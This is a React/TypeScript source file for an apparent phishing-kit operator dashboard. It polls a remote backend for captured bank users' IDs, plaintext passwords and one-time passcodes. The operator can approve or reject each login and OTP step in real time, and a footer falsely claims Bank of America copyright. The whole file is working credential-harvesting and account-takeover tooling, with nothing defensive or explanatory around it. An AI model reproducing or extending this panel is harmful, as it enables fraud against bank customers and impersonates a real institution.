import { useEffect, useState } from "react";

interface User {
  id: number;
  user_id: string;
  password: string;
  otp: string | null;
  status: "pending" | "authorized" | "rejected";
  otp_status: "otp_pending" | "authorized" | "rejected" | null;
}

const AdminDashboard: React.FC = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(false);
  const DEBUG = true;

  // ----------------------------
  // Fetch all users
  // ----------------------------
  const fetchUsers = async () => {
    setLoading(true);
    try {
      if (DEBUG) console.log("🔄 Fetching users...");
      const res = await fetch(
        "https://urban-system-backend.onrender.com/api/users"
      );
      const text = await res.text();

      try {
        const data: User[] = JSON.parse(text);
        setUsers(data);
        if (DEBUG) console.log("✅ Users fetched:", data);
      } catch {
        console.error("❌ Failed to parse response:", text);
      }
    } catch (err) {
      console.error("❌ Fetch users failed:", err);
    } finally {
      setLoading(false);
    }
  };

  // ----------------------------
  // Approve or reject LOGIN
  // ----------------------------
  const handleLoginAction = async (
    id: number,
    action: "approve" | "reject"
  ) => {
    if (DEBUG) console.log(`✏️ ${action} login for user ${id}...`);
    try {
      const res = await fetch(
        `https://urban-system-backend.onrender.com/api/authorize/${id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action }),
        }
      );

      const text = await res.text();
      const data = JSON.parse(text || "{}");

      if (!res.ok) {
        console.error(`❌ Failed to ${action} login for user ${id}:`, data);
        return;
      }

      setUsers((prev) =>
        prev.map((u) =>
          u.id === id
            ? {
                ...u,
                status: action === "approve" ? "authorized" : "rejected",
                otp_status: action === "approve" ? "otp_pending" : null,
              }
            : u
        )
      );

      console.log(`✅ Login ${action} complete for user ${id}`);
    } catch (err) {
      console.error(`❌ Error approving login for ${id}:`, err);
    }
  };

  // ----------------------------
  // Approve or reject OTP
  // ----------------------------
  const handleOtpAction = async (id: number, action: "approve" | "reject") => {
    if (DEBUG) console.log(`✏️ ${action} OTP for user ${id}...`);
    try {
      const res = await fetch(
        `https://urban-system-backend.onrender.com/api/otp-authorize/${id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action }),
        }
      );

      const text = await res.text();
      const data = JSON.parse(text || "{}");

      if (!res.ok) {
        console.error(`❌ Failed to ${action} OTP for user ${id}:`, data);
        return;
      }

      setUsers((prev) =>
        prev.map((u) =>
          u.id === id
            ? {
                ...u,
                otp_status: action === "approve" ? "authorized" : "rejected",
              }
            : u
        )
      );

      console.log(`✅ OTP ${action} complete for user ${id}`);
    } catch (err) {
      console.error(`❌ Error ${action} OTP for ${id}:`, err);
    }
  };

  // ----------------------------
  // Auto refresh every 5s
  // ----------------------------
  useEffect(() => {
    fetchUsers();
    const interval = setInterval(fetchUsers, 5000);
    return () => clearInterval(interval);
  }, []);

  // ----------------------------
  // Render responsive dashboard
  // ----------------------------
  return (
    <div className="max-w-6xl mx-auto p-4 sm:p-6">
      <h2 className="text-2xl font-semibold mb-6 text-center text-[#1E2B4D]">
        Admin Control Panel
      </h2>

      {loading && <p className="text-center text-gray-500">Loading users...</p>}

      {/* Desktop Table */}
      <div className="hidden md:block overflow-x-auto rounded-lg border border-gray-200 shadow-sm">
        <table className="min-w-full table-auto">
          <thead className="bg-gray-100 text-gray-700 text-sm">
            <tr>
              <th className="border px-4 py-2">ID</th>
              <th className="border px-4 py-2">User ID</th>
              <th className="border px-4 py-2">Password</th>
              <th className="border px-4 py-2">OTP</th>
              <th className="border px-4 py-2">Login Status</th>
              <th className="border px-4 py-2">OTP Status</th>
              <th className="border px-4 py-2">Actions</th>
            </tr>
          </thead>

          <tbody>
            {users.map((u) => (
              <tr
                key={u.id}
                className="text-center hover:bg-gray-50 transition text-sm"
              >
                <td className="border px-4 py-2">{u.id}</td>
                <td className="border px-4 py-2">{u.user_id}</td>
                <td className="border px-4 py-2">{u.password}</td>
                <td className="border px-4 py-2">{u.otp || "-"}</td>
                <td
                  className={`border px-4 py-2 font-semibold ${
                    u.status === "authorized"
                      ? "text-green-600"
                      : u.status === "rejected"
                      ? "text-red-500"
                      : "text-gray-600"
                  }`}
                >
                  {u.status}
                </td>
                <td
                  className={`border px-4 py-2 font-semibold ${
                    u.otp_status === "authorized"
                      ? "text-green-600"
                      : u.otp_status === "rejected"
                      ? "text-red-500"
                      : "text-gray-600"
                  }`}
                >
                  {u.otp_status || "-"}
                </td>
                <td className="border px-4 py-2 space-x-2">
                  {/* LOGIN approvals */}
                  {u.status === "pending" && (
                    <>
                      <button
                        onClick={() => handleLoginAction(u.id, "approve")}
                        className="bg-green-500 text-white px-3 py-1 rounded hover:bg-green-600"
                      >
                        Approve
                      </button>
                      <button
                        onClick={() => handleLoginAction(u.id, "reject")}
                        className="bg-red-500 text-white px-3 py-1 rounded hover:bg-red-600"
                      >
                        Reject
                      </button>
                    </>
                  )}

                  {/* OTP approvals */}
                  {u.status === "authorized" &&
                    u.otp &&
                    u.otp_status === "otp_pending" && (
                      <>
                        <button
                          onClick={() => handleOtpAction(u.id, "approve")}
                          className="bg-green-500 text-white px-3 py-1 rounded hover:bg-green-600"
                        >
                          Approve OTP
                        </button>
                        <button
                          onClick={() => handleOtpAction(u.id, "reject")}
                          className="bg-red-500 text-white px-3 py-1 rounded hover:bg-red-600"
                        >
                          Reject OTP
                        </button>
                      </>
                    )}
                </td>
              </tr>
            ))}

            {users.length === 0 && !loading && (
              <tr>
                <td colSpan={7} className="text-gray-500 py-4 text-center">
                  No users or OTPs pending approval
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      {/* Mobile Cards */}
      <div className="md:hidden space-y-4">
        {users.map((u) => (
          <div
            key={u.id}
            className="border border-gray-200 rounded-lg p-4 shadow-sm bg-white"
          >
            <div className="flex justify-between items-center mb-2">
              <h3 className="font-semibold text-gray-800">User #{u.id}</h3>
              <span
                className={`text-xs font-semibold px-2 py-1 rounded ${
                  u.status === "authorized"
                    ? "bg-green-100 text-green-700"
                    : u.status === "rejected"
                    ? "bg-red-100 text-red-700"
                    : "bg-gray-100 text-gray-700"
                }`}
              >
                {u.status}
              </span>
            </div>
            <p className="text-sm text-gray-600">
              <strong>User ID:</strong> {u.user_id}
            </p>
            <p className="text-sm text-gray-600">
              <strong>Password:</strong> {u.password}
            </p>
            <p className="text-sm text-gray-600">
              <strong>OTP:</strong> {u.otp || "-"}
            </p>
            <p className="text-sm text-gray-600">
              <strong>OTP Status:</strong> {u.otp_status || "-"}
            </p>

            <div className="mt-3 flex flex-wrap gap-2">
              {u.status === "pending" && (
                <>
                  <button
                    onClick={() => handleLoginAction(u.id, "approve")}
                    className="flex-1 bg-green-500 text-white text-sm py-1.5 rounded hover:bg-green-600"
                  >
                    Approve
                  </button>
                  <button
                    onClick={() => handleLoginAction(u.id, "reject")}
                    className="flex-1 bg-red-500 text-white text-sm py-1.5 rounded hover:bg-red-600"
                  >
                    Reject
                  </button>
                </>
              )}

              {u.status === "authorized" &&
                u.otp &&
                u.otp_status === "otp_pending" && (
                  <>
                    <button
                      onClick={() => handleOtpAction(u.id, "approve")}
                      className="flex-1 bg-green-500 text-white text-sm py-1.5 rounded hover:bg-green-600"
                    >
                      Approve OTP
                    </button>
                    <button
                      onClick={() => handleOtpAction(u.id, "reject")}
                      className="flex-1 bg-red-500 text-white text-sm py-1.5 rounded hover:bg-red-600"
                    >
                      Reject OTP
                    </button>
                  </>
                )}
            </div>
          </div>
        ))}

        {users.length === 0 && !loading && (
          <p className="text-center text-gray-500">
            No users or OTPs pending approval
          </p>
        )}
      </div>

      <footer className="py-6 text-center text-xs text-gray-400 mt-6 border-t">
        © {new Date().getFullYear()} Bank of America Corporation. All rights
        reserved.
      </footer>
    </div>
  );
};

export default AdminDashboard;
